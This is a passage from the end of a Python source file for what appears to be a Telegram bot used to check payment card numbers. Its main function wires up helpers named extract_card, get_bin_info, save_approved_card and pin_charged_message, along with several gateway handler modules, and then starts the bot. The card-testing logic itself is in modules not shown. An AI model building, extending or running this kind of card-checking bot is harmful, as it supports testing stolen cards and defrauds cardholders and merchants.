        text += f"\n\n{SYMBOLS['bullet']} **𝐓𝐨𝐭𝐚𝐥:** `{len(user_sites)}` 𝐬𝐢𝐭𝐞𝐬\n{create_footer()}"
        
        await event.answer("✅ 𝐒𝐢𝐭𝐞𝐬 𝐚𝐝𝐝𝐞𝐝", alert=False)
        await event.edit(event.message.text + f"\n\n{text}")
    except Exception as e:
        await event.answer(f"❌ {str(e)}", alert=True)

# ==================== MAIN FUNCTION ====================

async def main():
    await initialize_files()

    def get_cc_limit_wrapper(access_type, user_id=None):
        return get_cc_limit(access_type, user_id)
    
    utils_for_all = {
        'can_use': can_use,
        'banned_user_message': banned_user_message,
        'access_denied_message_with_button': access_denied_message_with_button,
        'extract_card': extract_card,
        'extract_all_cards': extract_all_cards,
        'get_bin_info': get_bin_info,
        'save_approved_card': save_approved_card,
        'get_cc_limit': get_cc_limit_wrapper,
        'pin_charged_message': pin_charged_message,
        'ADMIN_ID': ADMIN_ID,
        'load_json': load_json,
        'save_json': save_json,
        'SYMBOLS': SYMBOLS,
        'create_header': create_header,
        'create_footer': create_footer,
        'create_section': create_section,
        'progress_bar': progress_bar,
        'format_status': format_status
    }

    register_st_handlers(client, utils_for_all)
    register_pp_handlers(client, utils_for_all)
    register_py_handlers(client, utils_for_all)
    register_sq_handlers(client, utils_for_all)
    register_chk_handlers(client, utils_for_all)

    print("╔════════════════════════════════════╗")
    print("║       𝐁𝐎𝐓 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆           ║")
    print("╠════════════════════════════════════╣")
    print(f"║ 📅 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}       ║")
    print("╚════════════════════════════════════╝")
    
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
